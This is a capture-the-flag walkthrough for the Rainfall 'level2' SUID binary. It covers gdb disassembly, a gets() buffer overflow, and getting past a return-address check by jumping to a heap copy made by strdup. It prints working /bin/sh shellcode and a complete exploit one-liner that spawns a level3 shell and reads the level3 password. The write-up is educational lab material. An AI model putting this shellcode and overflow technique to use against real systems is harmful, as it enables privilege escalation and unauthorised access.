# Walk-through Level2

## Introduction
Level2 is part of the Rainfall challenge series, where the goal is to escalate privileges by exploiting a vulnerable binary. This walk-through covers analyzing the binary, identifying vulnerabilities, and obtaining elevated access.


## Security Checks
Examining the binary's security mechanisms reveals that it lacks several modern protections, making it more susceptible to exploitation:

```bash
level2@RainFall:~$ checksec --file level2 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level2

```
**Key observations:**
```
> **No RELRO** : The binary does not protect against GOT overwrite attacks.

> **No stack canary** : Buffer overflow attacks are possible.

> **NX disabled** : Stack is executable, allowing shellcode execution.

> **No PIE** : The binary has a fixed memory layout, making exploitation easier.
```
### Analyzing `level2`

After running the command `ls -l level2`, we observe the following output:

```
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
```

From this output, we can see that the binary `level2` is set with **SUID (Set User ID)** and **SGID (Set Group ID)** permissions. This means:

- The `s` in the owner (`rws`) and group (`r-s`) permission bits indicates that the program will run with the privileges of its owner (`level3`) and group (`users`), regardless of who executes it.
- In other words, when any user runs this program, it will execute as if it were run by the `level3` user.

## Debugging
### simple 
```
level2@RainFall:~$ ./level2 
hello world
hello world

```
After running ./level2, we found that it opens stdin to read input, and whatever input is provided, such as hello world, it will print it.

### with gdb (peda)
Now, let's debug the binary using GDB:  
```bash
gdb level2
b main  
disassemble  
```
**Output:** 
```
Dump of assembler code for function main:
   0x0804853f <+0>:	push   ebp
   0x08048540 <+1>:	mov    ebp,esp
=> 0x08048542 <+3>:	and    esp,0xfffffff0
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret    
End of assembler dump.
```
We see in the assembly that it calls the function p. Let's discover what p does.
```
disassemble p
```
**output:*
```
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   ebp
   0x080484d5 <+1>:	mov    ebp,esp
   0x080484d7 <+3>:	sub    esp,0x68
   0x080484da <+6>:	mov    eax,ds:0x8049860
   0x080484df <+11>:	mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.
```
### Analysis of Function `p`

#### **Identifying the Buffer Overflow**
The function `p` contains a call to `gets` at:
```assembly
0x080484ed <+25>:	call   0x80483c0 <gets@plt>
```
The `gets` function is inherently dangerous because it does not check for buffer size limits, allowing for a buffer overflow.

but The function then performs a check on a value stored at `[ebp-0xc]`:
```assembly
0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]  ; Load stored value
0x080484fb <+39>:	and    eax,0xb0000000          ; Mask upper bits
0x08048500 <+44>:	cmp    eax,0xb0000000          ; Compare with 0xb0000000
0x08048505 <+49>:	jne    0x8048527 <p+83>        ; If different, continue normal execution
```
This appears to be a form of **stack protection**, checking whether a certain **high address bit pattern** is present. This suggests that if an attacker overwrites `[ebp-0xc]` with an address in the `0xb0000000` region (which is typically used for **mapped memory, kernel space, or protection flags**), execution is **aborted via `_exit()`**.


#### **Bypassing the Protection**
The goal is to **bypass the stack check and execute arbitrary code**. Since the function later calls:
```assembly
0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
```
The `strdup` function **allocates memory using `malloc`** and returns a pointer to the newly allocated memory in the **heap**. This memory is **not checked** against the stack protection mechanism.

#### **Exploitation Strategy**
1. **Overflow the buffer** to control the **saved return address**.
2. **Redirect execution to `strdup`'s return address**.
3. Since `malloc` allocates memory in the heap, a payload in the heap can be used to **bypass the stack protection check**.

## **Exploitation**

### Finding the Buffer Offset
To make exploitation easier, we use **PEDA** (Python Exploit Development Assistance for GDB) to determine the buffer offset. After several attempts, we found that **80 bytes** overwrite the saved EIP. We can verify this by injecting 80 "A" characters followed by "BBBB" (hex `0x42424242`):

```bash
gdb-peda$ r < <(python -c 'print("A"*80 + "BBBB")')
```

Output:
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
**Register output:**
[----------------------------------registers-----------------------------------]
EAX: 0x804a008 ('A' <repeats 64 times>, "BBBB", 'A' <repeats 12 times>, "BBBB")
EBX: 0xb7fd0ff4 --> 0x1a4d7c 
ECX: 0x0 
EDX: 0xbffff6dc ('A' <repeats 64 times>, "BBBB", 'A' <repeats 12 times>, "BBBB")
ESI: 0x0 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff730 --> 0x8048500 (<p+44>: cmp eax,0xb0000000)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
```

As seen from the output, the **EIP** register has been successfully overwritten with `0x42424242` (`"BBBB"`), confirming that the buffer overflow is functioning correctly.

### Finding the Address in Heap
Next, we need to find the address of the shellcode. To do this, we can use **ltrace**:

```bash
level2@RainFall:~$ ltrace ./level2 
__libc_start_main(0x804853f, 1, 0xbffff804, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20) = 0
gets(0xbffff70c, 0, 0, 0xb7e5ec73, 0x80482b5) = 0xbffff70c
puts("") = 1
strdup("") = 0x0804a008
+++ exited (status 8) +++
```

From the output of `ltrace`, we observe that `strdup` returns the address `0x0804a008`.

### Constructing the Payload
The payload consists of the following parts:
1. The shellcode:
   ```
   "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
   ```
2. Padding (to fill the buffer up to the return address offset), which is `80 - 28 = 52` "A" characters.
3. The address of the heap (`0x0804a008`).

The final exploit payload is:

```python
python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 52 + "\x08\xa0\x04\x08")'
```

### Running the Exploit
We can then pipe the payload into the vulnerable program:

```bash
level2@RainFall:~$ (python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * (80-28) + "\x08\xa0\x04\x08")'; cat) | ./level2 
1�Ph//shh/bin����°
                  1�@̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
whoami
level3
cat /home/user/level3/.pass            
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

```